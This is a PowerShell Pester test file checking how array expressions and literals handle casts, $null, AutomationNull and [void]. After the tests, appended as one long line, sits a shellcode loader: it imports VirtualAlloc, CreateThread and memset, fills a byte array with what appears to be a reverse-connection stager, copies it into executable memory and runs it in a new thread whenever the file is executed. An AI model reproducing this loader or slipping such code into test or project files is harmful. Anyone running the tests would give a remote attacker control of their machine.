

Describe "ArrayExpression Tests" -Tags "CI" {
    It "@([object[]](1,2,3)) should return a 3-element array of object[]" {
        $result = @([object[]](1,2,3))
        $result.GetType().FullName | Should -BeExactly "System.Object[]"
        $result.Length | Should -Be 3
    }

    It "@([int[]](1,2,3)) should return a 3-element array of object[]" {
        $result = @([int[]](1,2,3))
        $result.GetType().FullName | Should -BeExactly "System.Object[]"
        $result.Length | Should -Be 3
    }

    It "@([object[]]`$null) should return a 1-element(`$null) array of object[]" {
        $result = @([object[]]$null)
        $result.GetType().FullName | Should -BeExactly "System.Object[]"
        $result.Length | Should -Be 1
        $result[0] | Should -BeNullOrEmpty
    }

    It "@([int[]]`$null) should return a 1-element(`$null) array of object[]" {
        $result = @([int[]]$null)
        $result.GetType().FullName | Should -BeExactly "System.Object[]"
        $result.Length | Should -Be 1
        $result[0] | Should -BeNullOrEmpty
    }

    It "@([object[]][System.Management.Automation.Internal.AutomationNull]::Value) should return a 1-element(`$null) array of object[]" {
        $result = @([object[]][System.Management.Automation.Internal.AutomationNull]::Value)
        $result.GetType().FullName | Should -BeExactly "System.Object[]"
        $result.Length | Should -Be 1
        $result[0] | Should -BeNullOrEmpty
    }

    It "@([int[]][System.Management.Automation.Internal.AutomationNull]::Value) should return a 1-element(`$null) array of object[]" {
        $result = @([int[]][System.Management.Automation.Internal.AutomationNull]::Value)
        $result.GetType().FullName | Should -BeExactly "System.Object[]"
        $result.Length | Should -Be 1
        $result[0] | Should -BeNullOrEmpty
    }

    It "@(`$null) should return a 1-element(`$null) array of object[]" {
        $result = @($null)
        $result.GetType().FullName | Should -BeExactly "System.Object[]"
        $result.Length | Should -Be 1
        $result[0] | Should -BeNullOrEmpty
    }

    It "@([System.Management.Automation.Internal.AutomationNull]::Value) should return an empty array of object[]" {
        $result = @([System.Management.Automation.Internal.AutomationNull]::Value)
        $result.GetType().FullName | Should -BeExactly "System.Object[]"
        $result.Length | Should -Be 0
    }

    It "@([object[]]`$a) should return a new array" {
        $a = 1,2,3
        $result = @([object[]]$a)
        $result.GetType().FullName | Should -BeExactly "System.Object[]"
        $result.Length | Should -Be 3
    }

    It "@([int[]]`$a) should return a new array" {
        $a = 1,2,3
        $result = @([int[]]$a)
        $result.GetType().FullName | Should -BeExactly "System.Object[]"
        $result.Length | Should -Be 3
    }

    It "@([System.Collections.Generic.List[object]]`$null) should return a 1-element(`$null) array of object[]" {
        $result = @([System.Collections.Generic.List[object]]$null)
        $result.GetType().FullName | Should -BeExactly "System.Object[]"
        $result.Length | Should -Be 1
        $result[0] | Should -BeNullOrEmpty
    }

    It "@([void](New-Item)) should create file" {
        try {
            $testFile = Join-Path $TestDrive (New-Guid)
            $result = @([void](New-Item $testFile -ItemType File))
            
            $testFile | Should -Exist
            
            $result.Count | Should -Be 0
        } finally {
            Remove-Item $testFile -Force -ErrorAction SilentlyContinue
        }
    }
}

Describe "ArrayLiteral Tests" -Tags "CI" {
    It "'[void](New-Item),2,3' should return a 3-element array and first element is AutomationNull" {
        try {
            $testFile = Join-Path $TestDrive (New-Guid)
            $result = [void](New-Item $testFile -ItemType File), 2, 3
            
            $testFile | Should -Exist
            
            $result.Count | Should -Be 3

            
            $result[0] | ForEach-Object { "YES" } | Should -BeNullOrEmpty
            $result | Measure-Object | ForEach-Object -MemberName Count | Should -Be 2
        } finally{
            Remove-Item $testFile -Force -ErrorAction SilentlyContinue
        }
    }

    It "'[void]1, [void](New-Item), [void]2' should return a 3-AutomationNull-element array" {
        try {
            $testFile = Join-Path $TestDrive (New-Guid)
            $result = [void]1, [void](New-Item $testFile -ItemType File), [void]2
            
            $testFile | Should -Exist
            
            $result.Count | Should -Be 3

            
            $result | ForEach-Object { "YES" } | Should -BeNullOrEmpty
        } finally {
            Remove-Item $testFile -Force -ErrorAction SilentlyContinue
        }
    }

    It "'[void]`$arraylist1.Add(1), `$arraylist2.Clear()' should return a 2-AutomationNull-element array" {
        $arraylist1 = [System.Collections.ArrayList]::new()
        $arraylist2 = [System.Collections.ArrayList]::new()

        $arraylist2.Add(2) > $null
        $arraylist2.Count | Should -Be 1

        
        
        $result = [void]$arraylist1.Add(1), $arraylist2.Clear()
        $result.Count | Should -Be 2
        $result | ForEach-Object { "YES" } | Should -BeNullOrEmpty

        $arraylist1.Count | Should -Be 1
        $arraylist1[0] | Should -Be 1

        $arraylist2.Count | Should -Be 0
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x29,0x8c,0x53,0xcf,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

